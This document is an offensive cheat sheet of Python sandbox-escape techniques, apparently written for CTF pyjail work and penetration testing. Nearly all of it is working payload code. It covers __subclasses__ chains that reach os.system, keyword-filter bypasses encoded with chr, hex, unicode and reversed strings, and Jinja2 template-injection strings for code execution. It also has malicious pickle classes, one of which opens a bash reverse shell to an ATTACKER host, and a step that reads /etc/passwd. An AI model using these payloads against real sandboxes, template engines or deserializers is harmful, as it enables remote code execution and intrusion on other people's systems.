# Python Sandbox Escape Techniques

## __subclasses__ Chain (Universal)

```python
# Access all loaded classes via object.__subclasses__()
''.__class__.__mro__[1].__subclasses__()

# Find useful classes (index varies per Python version):
# os._wrap_close → access os module
# subprocess.Popen → direct command execution
# warnings.catch_warnings → access builtins

# Automated finder:
for i, cls in enumerate(''.__class__.__mro__[1].__subclasses__()):
    if 'Popen' in cls.__name__:
        print(f"[{i}] {cls}")
    if '_wrap_close' in cls.__name__:
        print(f"[{i}] {cls}")

# Execute via os._wrap_close:
''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['system']('id')

# Execute via subprocess.Popen:
''.__class__.__mro__[1].__subclasses__()[IDX]('id', shell=True, stdout=-1).communicate()
```

## Builtins Recovery

```python
# If __builtins__ is deleted/restricted:
().__class__.__bases__[0].__subclasses__()[IDX].__init__.__globals__['__builtins__']

# Via reload
().__class__.__bases__[0].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('os').system('id')

# Via help (interactive)
help.__class__.__mro__[1].__subclasses__()  # same technique
```

## String Concatenation Bypass

```python
# If certain keywords are blocked:
# Bypass "import" / "os" / "system"
__import__('o'+'s').system('id')
getattr(__import__('o'+'s'), 'sy'+'stem')('id')

# Bypass using chr()
eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))

# Hex
eval('\x5f\x5fimport\x5f\x5f("os").system("id")')

# Unicode
eval('\u005f\u005fimport\u005f\u005f("os").system("id")')

# Octal
eval('\137\137import\137\137("os").system("id")')

# Reverse
eval(')"di"(metsys.)"so"(__tropmi__'[::-1])
```

## eval / exec Specific

```python
# If inside eval():
__import__('os').system('id')
exec('import os; os.system("id")')

# Compile + exec (bypass simple string checks)
exec(compile('import os; os.system("id")', '<x>', 'exec'))

# Via code objects
code = type(lambda:0)(type(lambda:0).__code__.__class__(
    0, 0, 0, 0, 0, 0, b'\x64\x00\x53\x00', (None,), (), (), '', '', 0, b''), {})
```

## Without Builtins

```python
# Access builtins through any function's __globals__
print.__self__  # → builtins module
(lambda:0).__globals__['__builtins__'].__import__('os').system('id')

# Via sys.modules
''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['__builtins__']['__import__']('sys').modules['os'].system('id')

# Via typing (often importable)
from typing import *
get_type_hints.__globals__['__builtins__']['__import__']('os').system('id')
```

## SSTI (Jinja2 Context)

```python
# Jinja2 sandbox escape (see ssti_to_rce for full details)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[IDX]('id',shell=True,stdout=-1).communicate()}}
```

## Pickle Exploitation

```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

# Serialize
payload = pickle.dumps(Exploit())

# For reverse shell:
class RevShell:
    def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (
            ['bash', '-c', 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'],
        ))

# YAML equivalent (PyYAML unsafe load):
# !!python/object/apply:os.system ['id']
```

## PyJail Bypass Patterns

```python
# Common restrictions and bypasses:

# No dots: use getattr()
getattr(getattr(__builtins__, '__import__')('os'), 'system')('id')

# No parentheses (Python 3.8+ walrus operator abuse):
# Decorators execute without parens
@exec
@input
class X:pass
# Type input: __import__('os').system('id')

# No underscores:
# Use chr() to build __import__
# Or Unicode: ＿ (fullwidth low line, U+FF3F)

# Length limit:
exec(input())  # 12 chars, then type full payload

# No import:
# __subclasses__ chain doesn't need import
# breakpoint() → drops to pdb → can import
```

## Restricted Environment Checklist

```
1. Check available builtins: dir(__builtins__)
2. Check blocked words: try common keywords
3. Check available modules: help('modules')
4. Check sys.modules: already imported modules
5. Try __subclasses__ chain (works without imports)
6. Try string encoding bypasses (hex, chr, unicode)
7. Try pickle/yaml if deserialization is available
8. Check if eval/exec/compile are available
9. Check for breakpoint() / pdb access
10. Check file I/O: open('/etc/passwd').read()
```
